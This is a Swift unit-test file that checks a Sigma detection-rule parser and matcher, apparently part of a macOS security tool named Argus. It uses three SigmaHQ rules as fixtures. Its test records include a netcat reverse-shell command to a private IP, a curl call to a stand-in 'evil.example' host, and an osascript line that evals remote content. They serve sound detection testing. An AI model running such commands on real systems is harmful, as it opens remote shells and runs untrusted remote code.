import XCTest
@testable import Argus

/// Validates the YAML parser, condition evaluator, and matcher against
/// real rule text fetched from SigmaHQ/sigma (not paraphrased) — the
/// highest-risk part of the Sigma subset, since it's a hand-rolled parser
/// for a real external format rather than something we control end to end.
final class SigmaEngineTests: XCTestCase {

    private let netcatReverseShell = """
    title: Potential Netcat Reverse Shell Execution
    id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
    status: test
    description: Detects execution of netcat with the "-e" flag followed by common shells. This could be a sign of a potential reverse shell setup.
    references:
        - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
    author: '@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)'
    date: 2023-04-07
    tags:
        - attack.execution
        - attack.t1059
    logsource:
        category: process_creation
        product: linux
    detection:
        selection_nc:
            Image|endswith:
                - '/nc'
                - '/ncat'
        selection_flags:
            CommandLine|contains:
                - ' -c '
                - ' -e '
        selection_shell:
            CommandLine|contains:
                - ' bash'
                - '/bin/sh'
                - '/bin/zsh'
        condition: all of selection_*
    falsepositives:
        - Unlikely
    level: high
    """

    // Fixture text only — a YAML detection-rule string being parsed and pattern-matched
    // against, never executed. It exists to test that Argus can *detect* a JXA payload
    // that uses `eval(...)`, not to invoke eval itself.
    private let jxaInMemory = """
    title: JXA In-memory Execution Via OSAScript
    id: f1408a58-0e94-4165-b80a-da9f96cf6fc3
    status: test
    description: Detects possible malicious execution of JXA in-memory via OSAScript
    author: Sohan G (D4rkCiph3r)
    date: 2023-01-31
    tags:
        - attack.t1059.002
        - attack.execution
    logsource:
        product: macos
        category: process_creation
    detection:
        selection_main:
            CommandLine|contains|all:
                - 'osascript'
                - ' -e '
                - 'eval'
                - 'NSData.dataWithContentsOfURL'
        selection_js:
            - CommandLine|contains|all:
                  - ' -l '
                  - 'JavaScript'
            - CommandLine|contains: '.js'
        condition: all of selection_*
    falsepositives:
        - Unknown
    level: high
    """

    private let xcssetMalware = """
    title: Potential XCSSET Malware Infection
    id: 47d65ac0-c06f-4ba2-a2e3-d263139d0f51
    status: test
    description: Identifies execution traces of XCSSET.
    author: Tim Rauch (rule), Elastic (idea)
    date: 2022-10-17
    tags:
        - attack.command-and-control
    logsource:
        category: process_creation
        product: macos
    detection:
        selection_1_curl:
            ParentImage|endswith: '/bash'
            Image|endswith: '/curl'
            CommandLine|contains:
                - '/sys/log.php'
                - '/sys/bin/Pods'
        selection_1_https:
            CommandLine|contains: 'https://'
        selection_other_1:
            ParentImage|endswith: '/bash'
            Image|endswith: '/osacompile'
            CommandLine|contains|all:
                - '/Users/'
                - '/Library/Group Containers/'
        condition: all of selection_1_* or 1 of selection_other_*
    falsepositives:
        - Unknown
    level: medium
    """

    private func parseFirst(_ yaml: String, source: String = "test.yml") -> SigmaRule? {
        let docs = YAMLParser.parseDocuments(yaml)
        guard let first = docs.first else { return nil }
        return SigmaRule.parse(first, sourceFile: source, origin: .sigmaHQMacOS, rawYAML: yaml)
    }

    // MARK: - Parsing

    func testParsesNetcatRuleMetadata() {
        guard let rule = parseFirst(netcatReverseShell) else { return XCTFail("failed to parse") }
        XCTAssertEqual(rule.title, "Potential Netcat Reverse Shell Execution")
        XCTAssertEqual(rule.id, "7f734ed0-4f47-46c0-837f-6ee62505abd9")
        XCTAssertEqual(rule.level, "high")
        XCTAssertEqual(rule.severity, .elevated)
        XCTAssertEqual(rule.detection.count, 3)
        XCTAssertEqual(rule.condition, "all of selection_*")
        XCTAssertEqual(rule.techniqueLabel, "T1059")
        XCTAssertTrue(rule.author?.contains("d4ns4n_") == true, "quoted author with @ and comma should parse cleanly")
    }

    func testParsesListOfMapsSelection() {
        guard let rule = parseFirst(jxaInMemory) else { return XCTFail("failed to parse") }
        let selectionJS = rule.detection.first { $0.name == "selection_js" }?.selection
        XCTAssertEqual(selectionJS?.items.count, 2, "selection_js is a YAML list of two alternative field-groups")
    }

    // MARK: - Matching

    func testNetcatMatchesRealCommandLine() {
        guard let rule = parseFirst(netcatReverseShell) else { return XCTFail("failed to parse") }
        let record = ["Image": "/usr/bin/nc", "CommandLine": "nc -e /bin/sh 10.0.0.5 4444"]
        XCTAssertTrue(SigmaMatcher.matches(rule, record: record))
    }

    func testNetcatDoesNotMatchPlainNetcatUsage() {
        guard let rule = parseFirst(netcatReverseShell) else { return XCTFail("failed to parse") }
        let record = ["Image": "/usr/bin/nc", "CommandLine": "nc -zv example.com 443"]
        XCTAssertFalse(SigmaMatcher.matches(rule, record: record), "port scan usage has no -e flag or shell — must not match")
    }

    func testJXAMatchesContainsAllAndAlternativeGroup() {
        guard let rule = parseFirst(jxaInMemory) else { return XCTFail("failed to parse") }
        let matching = ["CommandLine": "osascript -l JavaScript -e 'eval(NSData.dataWithContentsOfURL(...))'"]
        XCTAssertTrue(SigmaMatcher.matches(rule, record: matching))

        let missingOne = ["CommandLine": "osascript -e 'eval(1+1)'"] // missing NSData.dataWithContentsOfURL and JS marker
        XCTAssertFalse(SigmaMatcher.matches(rule, record: missingOne))
    }

    func testXCSSETConditionCombinesAllAndOneOfAcrossGroups() {
        guard let rule = parseFirst(xcssetMalware) else { return XCTFail("failed to parse") }

        // selection_1_curl + selection_1_https path (all of selection_1_*)
        let curlPath: [String: String] = [
            "ParentImage": "/bin/bash", "Image": "/usr/bin/curl",
            "CommandLine": "curl https://evil.example/sys/log.php",
        ]
        XCTAssertTrue(SigmaMatcher.matches(rule, record: curlPath))

        // selection_other_1 path (1 of selection_other_*), unrelated to curl group
        let osacompilePath: [String: String] = [
            "ParentImage": "/bin/bash", "Image": "/usr/bin/osacompile",
            "CommandLine": "osacompile -o /Users/mark/Library/Group Containers/foo.app main.applescript",
        ]
        XCTAssertTrue(SigmaMatcher.matches(rule, record: osacompilePath))

        let benign: [String: String] = ["ParentImage": "/bin/bash", "Image": "/usr/bin/ls", "CommandLine": "ls -la"]
        XCTAssertFalse(SigmaMatcher.matches(rule, record: benign))
    }

    func testMultiDocumentFileParsesBothRules() {
        let combined = netcatReverseShell + "\n---\n" + jxaInMemory
        let docs = YAMLParser.parseDocuments(combined)
        XCTAssertEqual(docs.count, 2)
        let rules = docs.compactMap { SigmaRule.parse($0, sourceFile: "combined.yml", origin: .custom, rawYAML: "") }
        XCTAssertEqual(rules.map(\.title), ["Potential Netcat Reverse Shell Execution", "JXA In-memory Execution Via OSAScript"])
    }
}
